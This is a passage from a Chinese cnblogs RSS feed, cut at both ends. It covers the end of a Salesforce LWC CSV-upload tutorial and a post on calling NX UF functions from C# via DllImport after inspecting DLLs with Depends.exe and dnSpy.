    &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;lightning-card&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;template&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;fileUploadUsingInput.js：因为用string存储，所以对文件大小有字节的限制。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;48&quot;&gt;
&lt;pre&gt;
import { LightningElement, track, api } from 'lwc'&lt;span&gt;;
import saveFile from &lt;/span&gt;'@salesforce/apex/FileUploadUsingInputController.saveFile'&lt;span&gt;;
import {ShowToastEvent} from &lt;/span&gt;'lightning/platformShowToastEvent'&lt;span&gt;;

export &lt;/span&gt;&lt;span&gt;default&lt;/span&gt;&lt;span&gt; class FileUploadUsingInput extends LightningElement {
    @api recordId;
    @track fileName &lt;/span&gt;= ''&lt;span&gt;;
    @track UploadFile &lt;/span&gt;= 'Upload File'&lt;span&gt;;
    @track showLoadingSpinner &lt;/span&gt;= &lt;span&gt;false&lt;/span&gt;&lt;span&gt;;
    filesUploaded &lt;/span&gt;=&lt;span&gt; [];
    file;
    fileContents;
    fileReader;
    content;
    MAX_FILE_SIZE &lt;/span&gt;= 1500000&lt;span&gt;;

    get acceptedType() {
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; ['.csv'&lt;span&gt;];
    }

    handleFilesChange(event) {
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;(event.target.files.length &amp;gt; 0&lt;span&gt;) {
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.filesUploaded =&lt;span&gt; event.target.files;
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.fileName = event.target.files[0&lt;span&gt;].name;
        }
    }

    handleSave() {
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;(&lt;span&gt;this&lt;/span&gt;.filesUploaded.length &amp;gt; 0&lt;span&gt;) {
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.file = &lt;span&gt;this&lt;/span&gt;.filesUploaded[0&lt;span&gt;];
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (&lt;span&gt;this&lt;/span&gt;.file.size &amp;gt; &lt;span&gt;this&lt;/span&gt;&lt;span&gt;.MAX_FILE_SIZE) {
                window.console.log(&lt;/span&gt;'文件过大'&lt;span&gt;);
                &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; ;
            }
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.showLoadingSpinner = &lt;span&gt;true&lt;/span&gt;&lt;span&gt;;
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.fileReader= &lt;span&gt;new&lt;/span&gt;&lt;span&gt; FileReader();

            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.fileReader.onloadend = (() =&amp;gt;&lt;span&gt; {
                &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.fileContents = &lt;span&gt;this&lt;/span&gt;&lt;span&gt;.fileReader.result;
                let base64 &lt;/span&gt;= 'base64,'&lt;span&gt;;
                &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.content = &lt;span&gt;this&lt;/span&gt;.fileContents.indexOf(base64) +&lt;span&gt; base64.length;
                &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.fileContents = &lt;span&gt;this&lt;/span&gt;.fileContents.substring(&lt;span&gt;this&lt;/span&gt;&lt;span&gt;.content);
                &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;&lt;span&gt;.saveToFile();
            });
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.fileReader.readAsDataURL(&lt;span&gt;this&lt;/span&gt;&lt;span&gt;.file);
        }
        &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt; {
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.fileName = '选择一个csv文件上传'&lt;span&gt;;
        }
    }


    saveToFile() {
        saveFile({ recordId: &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.recordId, fileName: &lt;span&gt;this&lt;/span&gt;.file.name, base64Data: encodeURIComponent(&lt;span&gt;this&lt;/span&gt;&lt;span&gt;.fileContents)})
        .then(result &lt;/span&gt;=&amp;gt;&lt;span&gt; {
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.isTrue = &lt;span&gt;true&lt;/span&gt;&lt;span&gt;;
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.showLoadingSpinner = &lt;span&gt;false&lt;/span&gt;&lt;span&gt;;

            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;&lt;span&gt;.dispatchEvent(
                &lt;/span&gt;&lt;span&gt;new&lt;/span&gt;&lt;span&gt; ShowToastEvent({
                    title: &lt;/span&gt;'Success!!'&lt;span&gt;,
                    message: &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.fileName + ' - 上传成功'&lt;span&gt;,
                    variant: &lt;/span&gt;'success'&lt;span&gt;,
                }),
            );

        })
        .&lt;/span&gt;&lt;span&gt;catch&lt;/span&gt;(error =&amp;gt;&lt;span&gt; {
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;&lt;span&gt;.dispatchEvent(
                &lt;/span&gt;&lt;span&gt;new&lt;/span&gt;&lt;span&gt; ShowToastEvent({
                    title: &lt;/span&gt;'上传失败'&lt;span&gt;,
                    message: error.message,
                    variant: &lt;/span&gt;'error'&lt;span&gt;,
                }),
            );
        });
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;结果展示：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1. csv中做以下的数据&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/910966/202009/910966-20200929183934947-896633389.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;2. UI效果&lt;/p&gt;
&lt;p&gt; &lt;img src=&quot;https://img2020.cnblogs.com/blog/910966/202009/910966-20200929184304226-1680048095.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt; 3. debug log中打印出来的内容&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/910966/202009/910966-20200929173905771-1932323034.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;4. 格式化以后的效果 ，我们可以对数组进行二次操作，通过逗号进行分割就可以获取每一个cell对应的值，通常我们获取数据中的for循环 index为1，即跳过首行标题行。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/910966/202009/910966-20200929173916674-2105140835.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt; &lt;strong&gt;总结：&lt;/strong&gt;篇中主要讲述了关于lwc中文件上传以及文件解析的简单操作。第一种方式适合大文件上传，可自定制化不强但功能强悍。第二种方式可以对数据在apex端进行相关解析，但是有大小的限制。篇中有错误地方欢迎指出，有不懂欢迎留言。&lt;/p&gt;
</description>
<pubDate>Tue, 29 Sep 2020 13:57:00 +0000</pubDate>
<dc:creator>zero.zhang</dc:creator>
<og:description>本篇参考： https://developer.salesforce.com/docs/component-library/bundle/lightning-file-upload/documenta</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/zero-zyq/p/13749103.html</dc:identifier>
</item>
<item>
<title>NX二次开发-C#使用DllImport调用libufun.dll里的UF函数(反编译.net.dll)调用loop等UF函数 - Caesar卢尚宇</title>
<link>http://www.cnblogs.com/nxopen2018/p/13751886.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/nxopen2018/p/13751886.html</guid>
<description>&lt;p&gt;在写这篇文章的时候，我正在头晕，因为下班坐车回家，有些晕车了。头疼的要死。也吃不下去饭。&lt;/p&gt;
&lt;p&gt;早就想些这篇文章了，但是最近临近中秋十一，晚上太忙了。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;span&gt;版本：NX11+VS2013&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;最近这一年已经由C++过度到C#，改用C#做应用程序开发和NX二次开发。&lt;/p&gt;
&lt;p&gt;C#在做复杂界面开发的时候，WinFrom要比MFC简单的多(这个时候纯BlockUI已经满足不了集成功能的复杂界面需求了)，数据库连接也简单。&lt;/p&gt;
&lt;p&gt;言归正传&lt;/p&gt;
&lt;p&gt;在我经过一段时间的看QQ群别人讨论技术，给了我点启发，以及带着兴趣百度到了一些相关资料。学会了这种方法。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;span&gt;1.有需求&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;在用C#做NX二次开发的时候，我们一般需要引用NX官方封装好的的这几个dll。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1631792/202009/1631792-20200929195655407-1597959817.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt; 用C#的，一般都是用NXOpen的比较多，用UF的比较少，因为UF官方封装的不全，有很多没有封装。也因为C#用NXOpen语言上特别简单，好用。&lt;/p&gt;
&lt;p&gt;不需要delete，不需要迭代器，快速转换成字符串等等。&lt;/p&gt;
&lt;p&gt;那么在项目开发中，如果遇到loop这种官方没有封装的函数怎么办？&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;UF_MODL_ask_face_loops
UF_MODL_ask_loop_list_count
UF_MODL_ask_loop_list_item
UF_MODL_delete_loop_list&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;没关系，官方没有封装的UF函数，我们可以直接去这5个dll里调用。用DllImport去调用(是什么，怎么用请自行百度)。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
&lt;span&gt;libufun.dll
libnxopencpp.dll
libugopenint.dll
libnxopenuicpp.dll
libopenpp.dll&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;比如，我们现在想要调用UF_OBJ_set_color这个函数(这个函数官方已经封装了,这里只讲调用是怎么用的)，给一个块设置颜色。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;span&gt;2.反编译C.dll&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;首先，找到这个函数，在上面5个中的哪个dll里。&lt;/p&gt;
&lt;p&gt;这时就需要使用VC程序的反编译工具Depends.exe这个工具了，按个打开dll，去里面找到看有没有这个函数。&lt;/p&gt;
&lt;p&gt;功能介绍：&lt;/p&gt;
&lt;p&gt;查看 PE 模块的导入模块&lt;br/&gt;查看 PE 模块的导入和导出函数&lt;br/&gt;动态剖析 PE 模块的模块依赖性&lt;br/&gt;解析 C++ 函数名称&lt;/p&gt;
&lt;p&gt;等等&lt;/p&gt;
&lt;p&gt;这里我先打开&lt;span&gt;libufun.dll&lt;/span&gt;这个函数&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1631792/202009/1631792-20200929201159678-483746182.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt; 错误不用管，点确定关掉&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1631792/202009/1631792-20200929201334862-414430221.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt; 然后在这里找看有没有UF_OBJ_set_color&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1631792/202009/1631792-20200929201717706-1735872066.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt; 已经找到了，我们知道了可以去这个dll里调UF函数。&lt;/p&gt;
&lt;p&gt;下一步我们要开始去C#里调用，但是怎么调用？不知道？对吧？&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;span&gt;3.反编译.net.dll&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;这个时候又需要另外一个反编译dll工具了，dnSpy。&lt;/p&gt;
&lt;p&gt;功能介绍：&lt;/p&gt;
&lt;p&gt;dnSpy中文版是一款net程序反编译工具，可以对net程序进行反编译，还有替代库文档的功能，如果遇到了代码丢失或者损坏的情况，可以直接恢复。还可以设断点加进程调试代码。&lt;/p&gt;
&lt;p&gt;我们打开后是这个样子&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1631792/202009/1631792-20200929202023212-1886383364.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt; 下面我们打开官方封装的C# NXOpen.UF这个dll，去反编译下，看看里面都写了什么。(dnSpy是可以反编译别人写的普通的C#exe和dll的，桌面应用程序和NX二次开发的C#程序都可以反编译出来源代码，只要不加壳，加壳能反编译出部分代码)&lt;/p&gt;
&lt;p&gt;打开后如下&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1631792/202009/1631792-20200929202429958-1286836183.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;我们先去找到封装的UF_OBJ_set_color这个函数&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1631792/202009/1631792-20200929202635997-1476099505.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt; 这个时候我们就找到了，官方是怎么调用，怎么封装的NXOpen.UF.dll的了，是有出处的。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1631792/202009/1631792-20200929202732319-282179056.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;span&gt;4.我们如何调用&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt; 我们把这句抄下来，去我们的NX C#项目中使用。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37&quot;&gt;
&lt;pre&gt;
        [DllImport(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;libufun.dll&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, CallingConvention = CallingConvention.Cdecl, CharSet = CharSet.Ansi, EntryPoint = &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;UF_OBJ_set_color&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)]
        &lt;/span&gt;&lt;span&gt;internal&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;extern&lt;/span&gt; &lt;span&gt;int&lt;/span&gt; _SetColor(Tag object_id, &lt;span&gt;int&lt;/span&gt; color);
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;先加命名空间&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;using&lt;/span&gt;&lt;span&gt; System;
&lt;/span&gt;&lt;span&gt;using&lt;/span&gt;&lt;span&gt; NXOpen;
&lt;/span&gt;&lt;span&gt;using&lt;/span&gt;&lt;span&gt; NXOpen.UF;
&lt;/span&gt;&lt;span&gt;using&lt;/span&gt; System.Collections.Generic;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;C# List&amp;lt;&amp;gt;的命名空间&lt;/span&gt;
&lt;span&gt;using&lt;/span&gt; System.Runtime.InteropServices;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;DllImport的命名空间&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;在添加一个类，写代码&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1631792/202009/1631792-20200929203054730-422018730.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt; 然后在项目的Main入口函数里写代码。创建块-特征找体-设置颜色(用我们调用的函数)&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;44&quot;&gt;
&lt;pre&gt;
&lt;span&gt;//&lt;/span&gt;&lt;span&gt;创建块&lt;/span&gt;
FeatureSigns sign = FeatureSigns.Nullsign;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;定义布尔&lt;/span&gt;
&lt;span&gt;double&lt;/span&gt;[] cornet_pt = { &lt;span&gt;100.0&lt;/span&gt;, &lt;span&gt;0.0&lt;/span&gt;, &lt;span&gt;0.0&lt;/span&gt; };&lt;span&gt;//&lt;/span&gt;&lt;span&gt;定义原点&lt;/span&gt;
&lt;span&gt;string&lt;/span&gt;[] edge_len = { &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;100.0&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;100.0&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;100.0&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; };&lt;span&gt;//&lt;/span&gt;&lt;span&gt;定义长宽高&lt;/span&gt;
Tag blk_obj_id =&lt;span&gt; Tag.Null;
theUfSession.Modl.CreateBlock1(sign, cornet_pt, edge_len, &lt;/span&gt;&lt;span&gt;out&lt;/span&gt;&lt;span&gt; blk_obj_id);

&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;特征找体&lt;/span&gt;
Tag BodyTag =&lt;span&gt; Tag.Null;
theUfSession.Modl.AskFeatBody(blk_obj_id, &lt;/span&gt;&lt;span&gt;out&lt;/span&gt;&lt;span&gt; BodyTag);

NXOpen.Utilities.JAM.StartUFCall();

&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;设置颜色(调用UF函数)&lt;/span&gt;
OpenAPI._SetColor(BodyTag, &lt;span&gt;186&lt;/span&gt;&lt;span&gt;);

NXOpen.Utilities.JAM.EndUFCall();

Caesar卢尚宇
2020年9月29日&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;在我们反编译的代码中可以看到，在调用UF函数的时候，一定要用&lt;/p&gt;
&lt;p&gt;NXOpen.Utilities.JAM.StartUFCall();和NXOpen.Utilities.JAM.EndUFCall();&lt;/p&gt;
&lt;p&gt;这两个方法来开始和结束，中间调用。执行才有效，要不然执行不起作用。有点类似UF的&lt;/p&gt;
&lt;p&gt;UF_initialize和UF_terminate&lt;/p&gt;
&lt;p&gt;下面来执行下，我们上面的代码。看看效果。答案是可以调用的。也是这种方法调用的。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1631792/202009/1631792-20200929204524077-1776104660.gif&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;span&gt;5.如何调用loop等函数&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;好，现在我们已经知道怎么调用函数了，现在我们去调用loop那些函数。可以借鉴下已经封装的UF_MODL_ask_list_item是怎么定义输入输出的。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;72&quot;&gt;
&lt;pre&gt;
NX11+&lt;span&gt;VS2013


&lt;/span&gt;&lt;span&gt;using&lt;/span&gt;&lt;span&gt; System;
&lt;/span&gt;&lt;span&gt;using&lt;/span&gt;&lt;span&gt; NXOpen;
&lt;/span&gt;&lt;span&gt;using&lt;/span&gt;&lt;span&gt; NXOpen.UF;
&lt;/span&gt;&lt;span&gt;using&lt;/span&gt; System.Collections.Generic;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;C# List&amp;lt;&amp;gt;的命名空间&lt;/span&gt;
&lt;span&gt;using&lt;/span&gt; System.Runtime.InteropServices;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;DllImport的命名空间&lt;/span&gt;

&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; OpenAPI
{
    [DllImport(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;libufun.dll&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, CallingConvention = CallingConvention.Cdecl, CharSet = CharSet.Ansi, EntryPoint = &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;UF_OBJ_set_color&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)]
    &lt;/span&gt;&lt;span&gt;internal&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;extern&lt;/span&gt; &lt;span&gt;int&lt;/span&gt; _SetColor(Tag object_id, &lt;span&gt;int&lt;/span&gt;&lt;span&gt; color);

    [DllImport(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;libugopenint.dll&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)]
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;extern&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; uc1601(&lt;span&gt;string&lt;/span&gt; msg, &lt;span&gt;int&lt;/span&gt;&lt;span&gt; mode);

    [DllImport(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;libufun.dll&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, EntryPoint = &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;UF_MODL_ask_face_loops&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)]
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;extern&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; AskFaceLoops(Tag faceld, &lt;span&gt;out&lt;/span&gt;&lt;span&gt; IntPtr loopList);

    [DllImport(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;libufun.dll&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, EntryPoint = &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;UF_MODL_ask_loop_list_count&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)]
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;extern&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; AskLoopListCount(IntPtr loop, &lt;span&gt;out&lt;/span&gt; &lt;span&gt;int&lt;/span&gt;&lt;span&gt; count);

    [DllImport(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;libufun.dll&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, EntryPoint = &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;UF_MODL_ask_loop_list_item&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)]
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;extern&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; AskLoopListItem(IntPtr loopList, &lt;span&gt;int&lt;/span&gt; index, &lt;span&gt;out&lt;/span&gt; &lt;span&gt;int&lt;/span&gt; type, &lt;span&gt;out&lt;/span&gt;&lt;span&gt; IntPtr list);

    [DllImport(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;libufun.dll&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, EntryPoint = &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;UF_MODL_delete_loop_list&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)]
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;extern&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; DeleteLoopList(&lt;span&gt;out&lt;/span&gt;&lt;span&gt; IntPtr loopList);

    [DllImport(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;libufun.dll&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, EntryPoint = &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;UF_MODL_ask_list_count&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)]
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;extern&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; AskListCount(IntPtr list, &lt;span&gt;out&lt;/span&gt; &lt;span&gt;int&lt;/span&gt;&lt;span&gt; count);

    [DllImport(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;libufun.dll&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, EntryPoint = &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;UF_MODL_ask_list_item&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)]
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;extern&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; AskListItem(IntPtr list, &lt;span&gt;int&lt;/span&gt; index, &lt;span&gt;out&lt;/span&gt;&lt;span&gt; Tag obj);

    [DllImport(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;libufun.dll&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, EntryPoint = &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;UF_MODL_delete_list&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)]
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;extern&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; DeleteList(&lt;span&gt;out&lt;/span&gt;&lt;span&gt; IntPtr list);

    [DllImport(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;libufun.dll&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, EntryPoint = &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;UF_MODL_create_exp&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)]
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;extern&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; CreateExp(&lt;span&gt;string&lt;/span&gt;&lt;span&gt; expr_str);
}


&lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; Program
{
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; class members&lt;/span&gt;
    &lt;span&gt;private&lt;/span&gt; &lt;span&gt;static&lt;/span&gt;&lt;span&gt; Session theSession;
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;static&lt;/span&gt;&lt;span&gt; UI theUI;
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;static&lt;/span&gt;&lt;span&gt; UFSession theUfSession;
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt;&lt;span&gt; Program theProgram;
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;bool&lt;/span&gt;&lt;span&gt; isDisposeCalled;

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;------------------------------------------------------------------------------
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Constructor
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;------------------------------------------------------------------------------&lt;/span&gt;
    &lt;span&gt;public&lt;/span&gt;&lt;span&gt; Program()
    {
        &lt;/span&gt;&lt;span&gt;try&lt;/span&gt;&lt;span&gt;
        {
            theSession &lt;/span&gt;=&lt;span&gt; Session.GetSession();
            theUI &lt;/span&gt;=&lt;span&gt; UI.GetUI();
            theUfSession &lt;/span&gt;=&lt;span&gt; UFSession.GetUFSession();
            isDisposeCalled &lt;/span&gt;= &lt;span&gt;false&lt;/span&gt;&lt;span&gt;;
        }
        &lt;/span&gt;&lt;span&gt;catch&lt;/span&gt;&lt;span&gt; (NXOpen.NXException ex)
        {
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; ---- Enter your exception handling code here -----
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; UI.GetUI().NXMessageBox.Show(&quot;Message&quot;, NXMessageBox.DialogType.Error, ex.Message);&lt;/span&gt;
&lt;span&gt;        }
    }


    &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
    &lt;span&gt;///&lt;/span&gt;&lt;span&gt; 获取面的loop
    &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
